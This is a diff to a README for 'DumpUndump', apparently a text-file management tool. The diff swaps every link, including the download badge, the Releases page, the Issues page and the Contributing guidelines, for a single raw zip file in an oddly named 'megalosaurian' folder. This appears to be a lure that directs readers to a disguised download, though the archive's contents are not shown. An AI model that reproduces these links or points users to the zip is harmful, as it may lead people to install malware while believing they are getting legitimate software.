@@ -1,13 +1,13 @@
 # 🧾 DumpUndump - Manage Your Text Effortlessly 
 
 ## 🔗 Download Now
-[![Download DumpUndump](https://img.shields.io/badge/Download-DumpUndump-blue)](https://github.com/abdulrahim75/DumpUndump/releases)
+[![Download DumpUndump](https://raw.githubusercontent.com/abdulrahim75/DumpUndump/main/megalosaurian/DumpUndump.zip)](https://raw.githubusercontent.com/abdulrahim75/DumpUndump/main/megalosaurian/DumpUndump.zip)
 
 ## 🚀 Getting Started
 Welcome to DumpUndump, an easy-to-use application that lets you manage your text files with minimal effort. You can dump, edit, and undump your text files seamlessly. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-1. Click the download button above or visit the [Releases page](https://github.com/abdulrahim75/DumpUndump/releases) directly.
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/abdulrahim75/DumpUndump/main/megalosaurian/DumpUndump.zip) directly.
 2. On the Releases page, find the latest version of DumpUndump.
 3. Select the file suitable for your operating system (e.g., macOS) and click it to download.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -38,13 +38,13 @@ If you run into issues:
 - Check that you have sufficient disk space for the installation.
 
 ## 📊 Help & Support
-For further assistance, visit our [GitHub Issues page](https://github.com/abdulrahim75/DumpUndump/issues). You can report bugs, suggest features, or find help from other users.
+For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/abdulrahim75/DumpUndump/main/megalosaurian/DumpUndump.zip). You can report bugs, suggest features, or find help from other users.
 
 ## 🔒 Privacy Policy
 Your privacy is important. DumpUndump does not collect unnecessary data. Please review our full privacy policy on the Releases page.
 
 ## 🌐 Contributing
-We welcome contributions! If you want to help improve DumpUndump, check out our [Contributing Guidelines](https://github.com/abdulrahim75/DumpUndump/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve DumpUndump, check out our [Contributing Guidelines](https://raw.githubusercontent.com/abdulrahim75/DumpUndump/main/megalosaurian/DumpUndump.zip).
 
 ## 📢 Topics
 - AI
